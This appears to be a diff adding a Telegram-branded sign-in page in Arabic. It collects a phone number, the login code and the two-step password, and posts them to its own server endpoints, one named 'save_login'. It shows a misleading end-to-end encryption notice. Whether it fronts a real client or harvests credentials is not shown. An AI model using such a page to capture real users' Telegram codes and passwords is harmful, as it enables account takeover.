@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Telegram — Sign In</title>
+<link rel="icon" href="/static/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --blue:#2AABEE;--blue-d:#179CDE;
+  --green:#0AC630;--red:#FF3B30;
+  --bg:#17212B;--surface:#1E2C3A;--surface2:#242F3D;
+  --text:#F5F5F5;--text2:#8D969D;
+  --divider:rgba(255,255,255,.08);
+  --shadow:0 8px 32px rgba(0,0,0,.4);
+  --input-bg:#0D1520;--input-border:rgba(255,255,255,.1);
+  --radius:14px;
+}
+[data-theme=light]{
+  --bg:#F1F1F1;--surface:#FFF;--surface2:#F5F5F5;
+  --text:#000;--text2:#888;--divider:#E0E0E0;
+  --shadow:0 4px 20px rgba(0,0,0,.12);
+  --input-bg:#F5F5F5;--input-border:#E0E0E0;
+}
+html,body{min-height:100%;font-family:'Roboto',system-ui,sans-serif;background:var(--bg);color:var(--text)}
+.page{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;position:relative}
+/* Animated background */
+.bg-shapes{position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:0}
+.bg-shape{position:absolute;border-radius:50%;opacity:.08;animation:floatShape 8s ease-in-out infinite}
+.bg-shape:nth-child(1){width:400px;height:400px;background:var(--blue);top:-100px;right:-100px;animation-delay:0s}
+.bg-shape:nth-child(2){width:300px;height:300px;background:var(--blue-d);bottom:-80px;left:-80px;animation-delay:-3s}
+.bg-shape:nth-child(3){width:200px;height:200px;background:var(--blue);top:40%;left:10%;animation-delay:-5s}
+@keyframes floatShape{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(20px,-20px) scale(1.05)}}
+/* Card */
+.card{background:var(--surface);border-radius:var(--radius);box-shadow:var(--shadow);width:100%;max-width:390px;overflow:hidden;position:relative;z-index:1;border:1px solid var(--divider)}
+/* Steps */
+.steps-wrap{position:relative;overflow:hidden}
+.step{padding:40px 36px 32px;transition:transform .35s cubic-bezier(.4,0,.2,1),opacity .35s;position:absolute;width:100%;top:0;left:0;opacity:0;pointer-events:none;transform:translateX(60px)}
+.step.active{position:relative;opacity:1;pointer-events:all;transform:none}
+.step.exit{opacity:0;transform:translateX(-60px)}
+/* Logo */
+.logo-wrap{text-align:center;margin-bottom:28px}
+.tg-logo{width:88px;height:88px;background:linear-gradient(135deg,var(--blue) 0%,var(--blue-d) 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;box-shadow:0 8px 24px rgba(42,171,238,.35)}
+.tg-logo svg{width:52px;height:52px;fill:#fff}
+.logo-wrap h1{font-size:22px;font-weight:600;color:var(--text);margin-bottom:8px}
+.logo-wrap p{font-size:14px;color:var(--text2);line-height:1.5}
+/* Country badge */
+.country-badge{display:none;align-items:center;gap:8px;background:rgba(42,171,238,.08);border:1px solid rgba(42,171,238,.2);border-radius:10px;padding:8px 12px;margin-bottom:10px;font-size:14px;color:var(--text);transition:all .25s}
+.country-badge.show{display:flex}
+.country-badge .cb-flag{font-size:22px;line-height:1}
+.country-badge .cb-name{font-weight:500;flex:1}
+.country-badge .cb-code{color:var(--blue);font-weight:600}
+/* Inputs */
+.input-label{font-size:13px;color:var(--text2);margin-bottom:6px;display:block}
+.phone-field{position:relative;margin-bottom:6px}
+.phone-prefix{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:15px;font-weight:500;color:var(--text);pointer-events:none;z-index:1}
+.tg-input{width:100%;border:1.5px solid var(--input-border);border-radius:10px;padding:11px 14px;font-size:15px;font-family:inherit;color:var(--text);background:var(--input-bg);transition:border-color .2s,box-shadow .2s;outline:none}
+.tg-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(42,171,238,.12)}
+.tg-input::placeholder{color:var(--text2)}
+.tg-input.has-error{border-color:var(--red)}
+.phone-with-prefix{padding-left:32px}
+.input-hint{font-size:12px;color:var(--text2);margin-top:5px;line-height:1.4}
+.input-error{font-size:12px;color:var(--red);margin-top:5px;display:none}
+.input-error.show{display:block}
+/* Code input */
+.code-input-wrap{margin:8px 0 4px}
+.code-input{width:100%;border:2px solid var(--input-border);border-radius:12px;padding:14px;font-size:28px;font-weight:700;letter-spacing:8px;text-align:center;color:var(--blue);background:var(--input-bg);outline:none;transition:border-color .2s;caret-color:var(--blue)}
+.code-input:focus{border-color:var(--blue)}
+.code-input.has-error{border-color:var(--red);color:var(--red)}
+/* Button */
+.tg-btn{width:100%;padding:12px;border-radius:10px;background:var(--blue);color:#fff;font-size:15px;font-weight:600;cursor:pointer;border:none;transition:all .2s;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:8px}
+.tg-btn:hover{background:var(--blue-d);transform:translateY(-1px)}
+.tg-btn:active{transform:translateY(0)}
+.tg-btn:disabled{opacity:.6;pointer-events:none}
+/* Resend */
+.resend-row{text-align:center;margin-top:14px;font-size:13px;color:var(--text2)}
+.resend-btn{color:var(--blue);cursor:pointer;font-weight:500}
+.resend-btn:hover{text-decoration:underline}
+.countdown{color:var(--blue);font-weight:500}
+/* Back link */
+.back-link{text-align:center;margin-top:16px;font-size:13px;color:var(--text2);cursor:pointer}
+.back-link:hover{color:var(--text)}
+.back-link i{margin-left:4px}
+/* Security info */
+.security-note{display:flex;align-items:center;gap:8px;background:rgba(0,198,56,.07);border:1px solid rgba(0,198,56,.15);border-radius:8px;padding:8px 12px;margin-top:12px}
+.security-note i{color:var(--green);font-size:14px;flex-shrink:0}
+.security-note span{font-size:12px;color:var(--text2);line-height:1.4}
+/* Toast */
+#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.85);color:#fff;font-size:13px;padding:8px 18px;border-radius:20px;z-index:900;opacity:0;transition:opacity .2s;pointer-events:none;white-space:nowrap;border:1px solid rgba(255,255,255,.1)}
+#toast.show{opacity:1}
+/* Theme toggle */
+.theme-btn{position:absolute;top:12px;right:14px;width:32px;height:32px;border-radius:50%;background:var(--surface2);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--text2);font-size:14px;z-index:10;transition:all .2s}
+.theme-btn:hover{background:var(--divider);color:var(--text)}
+/* Account info display */
+.account-info{display:flex;align-items:center;gap:10px;background:var(--input-bg);border-radius:10px;padding:10px 14px;margin-bottom:16px}
+.account-av{width:40px;height:40px;border-radius:50%;background:var(--blue);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;color:#fff;flex-shrink:0}
+.account-num{font-size:14px;color:var(--text2)}
+</style>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+<div class="bg-shapes">
+  <div class="bg-shape"></div>
+  <div class="bg-shape"></div>
+  <div class="bg-shape"></div>
+</div>
+<div class="page">
+<div class="card">
+  <button class="theme-btn" onclick="toggleTheme()" id="themeBtn"><i class="fas fa-moon"></i></button>
+  <div class="steps-wrap" id="stepsWrap">
+
+    <!-- ── Step 1: Phone ── -->
+    <div class="step active" id="step1">
+      <div class="logo-wrap">
+        <div class="tg-logo">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.22 14.316l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.928.243z"/>
+          </svg>
+        </div>
+        <h1>Telegram</h1>
+        <p>أدخل رقم هاتفك للمتابعة</p>
+      </div>
+      <div class="country-badge" id="countryBadge">
+        <span class="cb-flag" id="cbFlag">🌍</span>
+        <span class="cb-name" id="cbName">الدولة</span>
+        <span class="cb-code" id="cbCode">+</span>
+      </div>
+      <label class="input-label">رقم الهاتف</label>
+      <div class="phone-field">
+        <span class="phone-prefix">+</span>
+        <input class="tg-input phone-with-prefix" type="tel" id="phoneInput" placeholder="966XXXXXXXXX" autocomplete="tel" oninput="onPhoneInput(this)">
+      </div>
+      <div class="input-error" id="phoneError"></div>
+      <div class="input-hint">أدخل رقمك مع رمز الدولة بدون +</div>
+      <div class="security-note">
+        <i class="fas fa-lock"></i>
+        <span>اتصالك محمي بالتشفير الكامل من طرف لطرف</span>
+      </div>
+      <button class="tg-btn" id="sendCodeBtn" onclick="sendCode()">
+        <i class="fas fa-arrow-left"></i>التالي
+      </button>
+    </div>
+
+    <!-- ── Step 2: Code ── -->
+    <div class="step" id="step2">
+      <div class="logo-wrap">
+        <div class="tg-logo">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.22 14.316l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.928.243z"/>
+          </svg>
+        </div>
+        <h1 id="step2Title">رمز التحقق</h1>
+        <p id="step2Desc">أدخل الرمز المرسل إلى تيليجرام</p>
+      </div>
+      <div class="account-info" id="step2AccountInfo">
+        <div class="account-av" id="step2Av">?</div>
+        <div><div id="step2PhoneDisplay" style="font-size:15px;font-weight:500">+</div><div class="account-num">تيليجرام</div></div>
+      </div>
+      <div class="code-input-wrap">
+        <input class="code-input" type="tel" id="codeInput" maxlength="8" placeholder="_ _ _ _ _ _" oninput="onCodeInput(this)" autocomplete="one-time-code">
+      </div>
+      <div class="input-error" id="codeError"></div>
+      <div class="resend-row">
+        <span id="countdownWrap" style="display:none">إعادة الإرسال خلال <span class="countdown" id="countdownNum">60</span>ث</span>
+        <span class="resend-btn" id="resendBtn" style="display:none" onclick="resendCode()">إعادة إرسال الرمز</span>
+      </div>
+      <button class="tg-btn" id="verifyCodeBtn" onclick="verifyCode()">
+        <i class="fas fa-check"></i>تأكيد
+      </button>
+      <div class="back-link" onclick="goBack(1)"><i class="fas fa-arrow-right"></i> تغيير رقم الهاتف</div>
+    </div>
+
+    <!-- ── Step 3: Password ── -->
+    <div class="step" id="step3">
+      <div class="logo-wrap">
+        <div class="tg-logo" style="background:linear-gradient(135deg,#667eea,#764ba2)">
+          <i class="fas fa-lock" style="font-size:32px;color:#fff"></i>
+        </div>
+        <h1>كلمة المرور</h1>
+        <p>هذا الحساب محمي بكلمة مرور ثنائية التحقق</p>
+      </div>
+      <label class="input-label">كلمة المرور</label>
+      <div style="position:relative">
+        <input class="tg-input" type="password" id="passwordInput" placeholder="••••••••" autocomplete="current-password">
+        <button onclick="togglePwdVis()" style="position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--text2);font-size:15px;background:none;border:none;cursor:pointer" id="pwdEye"><i class="fas fa-eye"></i></button>
+      </div>
+      <div class="input-error" id="passError"></div>
+      <div class="security-note">
+        <i class="fas fa-shield-alt"></i>
+        <span>كلمة مرور التحقق بخطوتين تحمي حسابك</span>
+      </div>
+      <button class="tg-btn" id="verifyPassBtn" onclick="verifyPassword()">
+        <i class="fas fa-unlock"></i>دخول
+      </button>
+      <div class="back-link" onclick="goBack(2)"><i class="fas fa-arrow-right"></i> رجوع</div>
+    </div>
+
+  </div>
+</div>
+</div>
+<div id="toast"></div>
+
+<script>
+let currentPhone = '';
+let countdownTimer = null;
+
+// ── Theme ──
+function initTheme(){
+  const saved = localStorage.getItem('tg-theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', saved);
+  document.getElementById('themeBtn').querySelector('i').className = saved === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
+}
+function toggleTheme(){
+  const cur = document.documentElement.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  document.documentElement.setAttribute('data-theme', next);
+  localStorage.setItem('tg-theme', next);
+  document.getElementById('themeBtn').querySelector('i').className = next === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
+}
+
+// ── Step Navigation ──
+function goToStep(n) {
+  document.querySelectorAll('.step').forEach(s => { s.classList.remove('active', 'exit'); });
+  const steps = document.querySelectorAll('.step');
+  steps[n-1].classList.add('active');
+}
+function goBack(n) { goToStep(n); }
+
+// ── Phone input ──
+const PHONE_PREFIXES = {
+  '966':'🇸🇦 السعودية','971':'🇦🇪 الإمارات','974':'🇶🇦 قطر','973':'🇧🇭 البحرين',
+  '968':'🇴🇲 عُمان','965':'🇰🇼 الكويت','20':'🇪🇬 مصر','218':'🇱🇾 ليبيا',
+  '213':'🇩🇿 الجزائر','212':'🇲🇦 المغرب','216':'🇹🇳 تونس','249':'🇸🇩 السودان',
+  '963':'🇸🇾 سوريا','962':'🇯🇴 الأردن','961':'🇱🇧 لبنان','964':'🇮🇶 العراق',
+  '967':'🇾🇪 اليمن','970':'🇵🇸 فلسطين','1':'🇺🇸 الولايات المتحدة','44':'🇬🇧 المملكة المتحدة',
+  '49':'🇩🇪 ألمانيا','33':'🇫🇷 فرنسا','7':'🇷🇺 روسيا','90':'🇹🇷 تركيا',
+};
+function onPhoneInput(el) {
+  const v = el.value.replace(/\D/g,'');
+  el.value = v;
+  hideErr('phoneError');
+  // Detect country
+  for (const [prefix, info] of Object.entries(PHONE_PREFIXES).sort((a,b)=>b[0].length-a[0].length)) {
+    if (v.startsWith(prefix)) {
+      const parts = info.split(' ');
+      document.getElementById('cbFlag').textContent = parts[0];
+      document.getElementById('cbName').textContent = parts.slice(1).join(' ');
+      document.getElementById('cbCode').textContent = '+' + prefix;
+      document.getElementById('countryBadge').classList.add('show');
+      return;
+    }
+  }
+  document.getElementById('countryBadge').classList.remove('show');
+}
+
+// ── Send Code ──
+async function sendCode() {
+  const phone = document.getElementById('phoneInput').value.trim().replace(/\D/g,'');
+  if (!phone || phone.length < 7) { showErr('phoneError', 'أدخل رقم هاتف صحيح'); return; }
+  currentPhone = '+' + phone;
+  const btn = document.getElementById('sendCodeBtn');
+  btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>جاري الإرسال...';
+  try {
+    const r = await fetch('/api/save_login', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({phone: currentPhone, user_id: 'user_1'})
+    });
+    const d = await r.json();
+    if (d.success || d.status === 'code_sent' || d.next === 'code') {
+      // Go to code step
+      document.getElementById('step2PhoneDisplay').textContent = currentPhone;
+      document.getElementById('step2Av').textContent = phone[0];
+      goToStep(2);
+      document.getElementById('codeInput').focus();
+      startCountdown();
+    } else if (d.next === 'already_authorized' || d.already_authorized) {
+      window.location.href = '/';
+    } else {
+      showErr('phoneError', d.message || 'فشل الإرسال');
+    }
+  } catch(e) { showErr('phoneError', 'خطأ في الشبكة'); }
+  btn.disabled = false; btn.innerHTML = '<i class="fas fa-arrow-left"></i>التالي';
+}
+
+// ── Verify Code ──
+function onCodeInput(el) {
+  el.value = el.value.replace(/\D/g,'');
+  hideErr('codeError');
+  if (el.value.length >= 5) verifyCode();
+}
+async function verifyCode() {
+  const code = document.getElementById('codeInput').value.trim();
+  if (!code || code.length < 4) { showErr('codeError', 'أدخل رمز التحقق'); return; }
+  const btn = document.getElementById('verifyCodeBtn');
+  btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>جاري التحقق...';
+  try {
+    const r = await fetch('/api/verify_code', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({phone: currentPhone, code, user_id: 'user_1'})
+    });
+    const d = await r.json();
+    if (d.success || d.next === 'success') {
+      showToast('✅ تم تسجيل الدخول بنجاح');
+      setTimeout(() => window.location.href = '/', 800);
+    } else if (d.next === 'password' || d.need_password) {
+      goToStep(3);
+      document.getElementById('passwordInput').focus();
+    } else {
+      document.getElementById('codeInput').classList.add('has-error');
+      setTimeout(() => document.getElementById('codeInput').classList.remove('has-error'), 1500);
+      showErr('codeError', d.message || 'رمز خاطئ');
+    }
+  } catch(e) { showErr('codeError', 'خطأ في الشبكة'); }
+  btn.disabled = false; btn.innerHTML = '<i class="fas fa-check"></i>تأكيد';
+}
+
+// ── Verify Password ──
+function togglePwdVis() {
+  const inp = document.getElementById('passwordInput');
+  const eye = document.getElementById('pwdEye').querySelector('i');
+  if (inp.type === 'password') { inp.type = 'text'; eye.className = 'fas fa-eye-slash'; }
+  else { inp.type = 'password'; eye.className = 'fas fa-eye'; }
+}
+async function verifyPassword() {
+  const pwd = document.getElementById('passwordInput').value;
+  if (!pwd) { showErr('passError', 'أدخل كلمة المرور'); return; }
+  const btn = document.getElementById('verifyPassBtn');
+  btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>جاري التحقق...';
+  try {
+    const r = await fetch('/api/verify_code', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({phone: currentPhone, password: pwd, user_id: 'user_1'})
+    });
+    const d = await r.json();
+    if (d.success || d.next === 'success') {
+      showToast('✅ تم تسجيل الدخول بنجاح');
+      setTimeout(() => window.location.href = '/', 800);
+    } else {
+      document.getElementById('passwordInput').classList.add('has-error');
+      setTimeout(() => document.getElementById('passwordInput').classList.remove('has-error'), 1500);
+      showErr('passError', d.message || 'كلمة مرور خاطئة');
+    }
+  } catch(e) { showErr('passError', 'خطأ في الشبكة'); }
+  btn.disabled = false; btn.innerHTML = '<i class="fas fa-unlock"></i>دخول';
+}
+
+// ── Resend Code ──
+async function resendCode() {
+  try {
+    await fetch('/api/save_login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({phone: currentPhone, user_id: 'user_1'}) });
+    showToast('تم إعادة إرسال الرمز');
+    document.getElementById('resendBtn').style.display = 'none';
+    startCountdown();
+  } catch(e) { showToast('فشل إعادة الإرسال'); }
+}
+
+// ── Countdown ──
+function startCountdown() {
+  let sec = 60;
+  const el = document.getElementById('countdownNum');
+  const wrap = document.getElementById('countdownWrap');
+  const btn = document.getElementById('resendBtn');
+  wrap.style.display = 'inline';
+  btn.style.display = 'none';
+  if (countdownTimer) clearInterval(countdownTimer);
+  countdownTimer = setInterval(() => {
+    sec--; el.textContent = sec;
+    if (sec <= 0) { clearInterval(countdownTimer); wrap.style.display = 'none'; btn.style.display = 'inline'; }
+  }, 1000);
+}
+
+// ── Helpers ──
+function showErr(id, msg) { const el = document.getElementById(id); el.textContent = msg; el.classList.add('show'); }
+function hideErr(id) { document.getElementById(id).classList.remove('show'); }
+function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 2500); }
+
+// ── Enter Key ──
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  if (document.getElementById('step1').classList.contains('active')) sendCode();
+  else if (document.getElementById('step2').classList.contains('active')) verifyCode();
+  else if (document.getElementById('step3').classList.contains('active')) verifyPassword();
+});
+
+// ── Init ──
+initTheme();
+// Check if already logged in
+fetch('/api/check_session_valid').then(r=>r.json()).then(d=>{ if(d.valid||d.authenticated) window.location.href='/'; }).catch(()=>{});
+</script>
+</body>
+</html>
